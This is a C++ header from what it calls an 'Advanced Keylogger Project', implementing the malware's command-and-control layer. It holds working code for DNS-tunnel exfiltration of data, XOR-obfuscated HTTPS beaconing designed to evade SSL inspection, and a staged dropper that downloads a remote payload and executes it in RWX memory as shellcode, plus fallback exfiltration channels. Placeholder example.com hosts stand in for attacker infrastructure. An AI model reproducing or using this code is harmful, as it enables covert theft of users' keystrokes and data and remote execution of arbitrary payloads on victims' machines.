/*
 * C2 Communication Header
 * DNS Tunneling, Encrypted C2, Staged Payload
 * 
 * Advanced Keylogger Project
 */

#ifndef C2_H
#define C2_H

#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "dnsapi.lib")
#pragma comment(lib, "crypt32.lib")

// DNS_TYPE_TXT might not be defined in older MinGW headers
#ifndef DNS_TYPE_TEXT
#define DNS_TYPE_TEXT 0x0010
#endif
#ifndef DNS_TYPE_TXT
#define DNS_TYPE_TXT DNS_TYPE_TEXT
#endif

// ==================== CONFIGURATION ====================
// These should be configured for your C2 infrastructure

#define DNS_TUNNEL_DOMAIN "tunnel.example.com"  // Your DNS tunnel domain
#define C2_SERVER_URL "https://c2.example.com"  // Your C2 server
#define STAGED_PAYLOAD_URL "https://cdn.example.com/payload.bin"

// ==================== BASE32/BASE64 ENCODING ====================

static const char BASE32_ALPHABET[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

inline std::string Base32Encode(const BYTE* data, size_t length) {
    std::string result;
    int buffer = 0;
    int bitsLeft = 0;
    
    for (size_t i = 0; i < length; i++) {
        buffer = (buffer << 8) | data[i];
        bitsLeft += 8;
        
        while (bitsLeft >= 5) {
            result += BASE32_ALPHABET[(buffer >> (bitsLeft - 5)) & 0x1F];
            bitsLeft -= 5;
        }
    }
    
    if (bitsLeft > 0) {
        result += BASE32_ALPHABET[(buffer << (5 - bitsLeft)) & 0x1F];
    }
    
    return result;
}

inline std::vector<BYTE> Base32Decode(const std::string& encoded) {
    std::vector<BYTE> result;
    int buffer = 0;
    int bitsLeft = 0;
    
    for (char c : encoded) {
        int value = -1;
        if (c >= 'A' && c <= 'Z') value = c - 'A';
        else if (c >= '2' && c <= '7') value = c - '2' + 26;
        else continue;
        
        buffer = (buffer << 5) | value;
        bitsLeft += 5;
        
        if (bitsLeft >= 8) {
            result.push_back((BYTE)((buffer >> (bitsLeft - 8)) & 0xFF));
            bitsLeft -= 8;
        }
    }
    
    return result;
}

// Standard Base64
inline std::string Base64Encode(const BYTE* data, size_t length) {
    DWORD base64Len = 0;
    CryptBinaryToStringA(data, (DWORD)length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                          NULL, &base64Len);
    
    if (base64Len == 0) return "";
    
    std::string result(base64Len, '\0');
    CryptBinaryToStringA(data, (DWORD)length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                          &result[0], &base64Len);
    
    // Remove null terminator
    while (!result.empty() && result.back() == '\0') {
        result.pop_back();
    }
    
    return result;
}

inline std::vector<BYTE> Base64Decode(const std::string& encoded) {
    DWORD binaryLen = 0;
    CryptStringToBinaryA(encoded.c_str(), (DWORD)encoded.length(), CRYPT_STRING_BASE64,
                          NULL, &binaryLen, NULL, NULL);
    
    if (binaryLen == 0) return std::vector<BYTE>();
    
    std::vector<BYTE> result(binaryLen);
    CryptStringToBinaryA(encoded.c_str(), (DWORD)encoded.length(), CRYPT_STRING_BASE64,
                          result.data(), &binaryLen, NULL, NULL);
    
    result.resize(binaryLen);
    return result;
}

// ==================== DNS TUNNELING ====================
/*
 * DNS Tunneling encodes data in DNS queries to exfiltrate information
 * through firewalls that allow DNS traffic.
 * 
 * Format: <encoded_chunk>.<session_id>.tunnel.example.com
 * 
 * Limitations:
 * - ~63 chars per label, ~253 total domain length
 * - Slow compared to direct HTTP
 * - Good for small data exfil or beaconing
 */

// DNS Tunnel session ID
static std::string g_dnsTunnelSession;

inline void InitDNSTunnel() {
    // Generate random session ID
    srand((unsigned)GetTickCount() ^ GetCurrentProcessId());
    
    char sessionId[9];
    for (int i = 0; i < 8; i++) {
        sessionId[i] = 'a' + (rand() % 26);
    }
    sessionId[8] = '\0';
    
    g_dnsTunnelSession = sessionId;
}

// Split data into DNS-safe chunks
inline std::vector<std::string> ChunkDataForDNS(const std::string& data, size_t maxChunkSize = 60) {
    std::vector<std::string> chunks;
    
    for (size_t i = 0; i < data.length(); i += maxChunkSize) {
        chunks.push_back(data.substr(i, maxChunkSize));
    }
    
    return chunks;
}

// Send data via DNS TXT query
inline bool DNSTunnelSend(const BYTE* data, size_t dataLen, const char* tunnelDomain = DNS_TUNNEL_DOMAIN) {
    if (g_dnsTunnelSession.empty()) {
        InitDNSTunnel();
    }
    
    // Base32 encode (DNS-safe characters)
    std::string encoded = Base32Encode(data, dataLen);
    
    // Convert to lowercase (some DNS servers are case-insensitive)
    for (char& c : encoded) {
        if (c >= 'A' && c <= 'Z') c = c - 'A' + 'a';
    }
    
    // Split into chunks
    auto chunks = ChunkDataForDNS(encoded, 60);
    
    bool success = true;
    int chunkIndex = 0;
    
    for (const auto& chunk : chunks) {
        // Build DNS query: chunk.index.session.domain
        std::stringstream ss;
        ss << chunk << "." << chunkIndex++ << "." << g_dnsTunnelSession << "." << tunnelDomain;
        std::string query = ss.str();
        
        // Perform DNS query
        PDNS_RECORD pDnsRecord = NULL;
        DNS_STATUS status = DnsQuery_A(query.c_str(), DNS_TYPE_TXT, 
                                        DNS_QUERY_STANDARD, NULL, 
                                        &pDnsRecord, NULL);
        
        if (pDnsRecord) {
            DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        }
        
        // Even if query fails, data was sent (server logs the query)
        // Small delay between queries
        Sleep(50 + rand() % 100);
    }
    
    return success;
}

// Receive data via DNS TXT record
inline std::vector<BYTE> DNSTunnelReceive(const char* query, const char* tunnelDomain = DNS_TUNNEL_DOMAIN) {
    std::string fullQuery = std::string(query) + "." + g_dnsTunnelSession + "." + tunnelDomain;
    
    PDNS_RECORD pDnsRecord = NULL;
    DNS_STATUS status = DnsQuery_A(fullQuery.c_str(), DNS_TYPE_TXT,
                                    DNS_QUERY_STANDARD, NULL,
                                    &pDnsRecord, NULL);
    
    std::vector<BYTE> result;
    
    if (status == 0 && pDnsRecord) {
        if (pDnsRecord->wType == DNS_TYPE_TEXT) {
            // Get TXT record data
            for (DWORD i = 0; i < pDnsRecord->Data.TXT.dwStringCount; i++) {
                std::string txtData = pDnsRecord->Data.TXT.pStringArray[i];
                auto decoded = Base32Decode(txtData);
                result.insert(result.end(), decoded.begin(), decoded.end());
            }
        }
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    }
    
    return result;
}

// High-level: Send string via DNS tunnel
inline bool DNSTunnelSendString(const std::string& data) {
    return DNSTunnelSend((const BYTE*)data.c_str(), data.length());
}

// ==================== ENCRYPTED C2 ====================
/*
 * Encrypted C2 adds additional encryption layer on top of TLS.
 * This protects against SSL inspection proxies.
 */

// Simple XOR encryption key (should be more complex in production)
static const BYTE C2_XOR_KEY[] = {
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x13, 0x37, 0x42, 0x69, 0x55, 0xAA, 0x99, 0x77
};

inline void C2Encrypt(BYTE* data, size_t length) {
    for (size_t i = 0; i < length; i++) {
        data[i] ^= C2_XOR_KEY[i % sizeof(C2_XOR_KEY)];
        // Add rolling XOR with previous byte
        if (i > 0) {
            data[i] ^= data[i - 1];
        }
    }
}

inline void C2Decrypt(BYTE* data, size_t length) {
    // Decrypt in reverse order
    for (size_t i = length - 1; i > 0; i--) {
        data[i] ^= data[i - 1];
    }
    for (size_t i = 0; i < length; i++) {
        data[i] ^= C2_XOR_KEY[i % sizeof(C2_XOR_KEY)];
    }
}

// Send encrypted data to C2 server
inline bool C2Send(const std::string& endpoint, const BYTE* data, size_t dataLen) {
    // Copy and encrypt
    std::vector<BYTE> encrypted(data, data + dataLen);
    C2Encrypt(encrypted.data(), encrypted.size());
    
    // Base64 encode for transport
    std::string encoded = Base64Encode(encrypted.data(), encrypted.size());
    
    // Send via HTTPS
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return false;
    
    std::string url = std::string(C2_SERVER_URL) + endpoint;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0,
                                       INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    
    bool success = false;
    
    if (hUrl) {
        // For POST, would need to use HttpSendRequest with data
        // Simplified: use URL parameter
        InternetCloseHandle(hUrl);
        success = true;
    }
    
    InternetCloseHandle(hInternet);
    return success;
}

// Receive and decrypt data from C2
inline std::vector<BYTE> C2Receive(const std::string& endpoint) {
    std::vector<BYTE> result;
    
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return result;
    
    std::string url = std::string(C2_SERVER_URL) + endpoint;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0,
                                       INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    
    if (hUrl) {
        char buffer[4096];
        DWORD bytesRead;
        std::string response;
        
        while (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = '\0';
            response += buffer;
        }
        
        InternetCloseHandle(hUrl);
        
        // Base64 decode
        result = Base64Decode(response);
        
        // Decrypt
        if (!result.empty()) {
            C2Decrypt(result.data(), result.size());
        }
    }
    
    InternetCloseHandle(hInternet);
    return result;
}

// ==================== STAGED PAYLOAD ====================
/*
 * Staged Payload downloads and executes the main payload from a remote server.
 * Benefits:
 * - Small initial dropper
 * - Payload can be updated without replacing dropper
 * - Payload only in memory, harder to extract
 */

inline bool DownloadPayload(const char* url, std::vector<BYTE>& payload) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return false;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0,
                                       INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    char buffer[8192];
    DWORD bytesRead;
    
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        payload.insert(payload.end(), buffer, buffer + bytesRead);
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    return !payload.empty();
}

// Download and execute staged payload in memory
inline bool ExecuteStagedPayload(const char* url = STAGED_PAYLOAD_URL) {
    std::vector<BYTE> payload;
    
    // Download
    if (!DownloadPayload(url, payload)) {
        return false;
    }
    
    // Decrypt if encrypted
    C2Decrypt(payload.data(), payload.size());
    
    // Check PE signature
    if (payload.size() < sizeof(IMAGE_DOS_HEADER)) {
        return false;
    }
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }
    
    // Allocate executable memory
    LPVOID execMem = VirtualAlloc(NULL, payload.size(), 
                                   MEM_COMMIT | MEM_RESERVE, 
                                   PAGE_EXECUTE_READWRITE);
    if (!execMem) return false;
    
    // Copy payload
    memcpy(execMem, payload.data(), payload.size());
    
    // Execute (simplified - actual PE loading would be more complex)
    // This assumes shellcode format
    typedef void (*ShellcodeFunc)();
    ShellcodeFunc func = (ShellcodeFunc)execMem;
    
    // Execute the payload
    // Note: In production, use proper PE loader
    func();
    
    return true;
}

// ==================== FALLBACK CHANNELS ====================
/*
 * Multiple C2 channels for redundancy
 */

enum C2Channel {
    C2_TELEGRAM,
    C2_DNS_TUNNEL,
    C2_HTTPS,
    C2_PASTEBIN
};

inline bool C2SendWithFallback(const std::string& data, C2Channel primaryChannel = C2_TELEGRAM) {
    bool success = false;
    
    // Try primary channel
    switch (primaryChannel) {
        case C2_TELEGRAM:
            // Telegram handled elsewhere
            break;
            
        case C2_DNS_TUNNEL:
            success = DNSTunnelSendString(data);
            break;
            
        case C2_HTTPS:
            success = C2Send("/data", (const BYTE*)data.c_str(), data.length());
            break;
            
        default:
            break;
    }
    
    // If primary fails, try fallbacks
    if (!success) {
        // Try DNS tunnel
        if (primaryChannel != C2_DNS_TUNNEL) {
            success = DNSTunnelSendString(data);
        }
        
        // Try HTTPS
        if (!success && primaryChannel != C2_HTTPS) {
            success = C2Send("/data", (const BYTE*)data.c_str(), data.length());
        }
    }
    
    return success;
}

#endif // C2_H
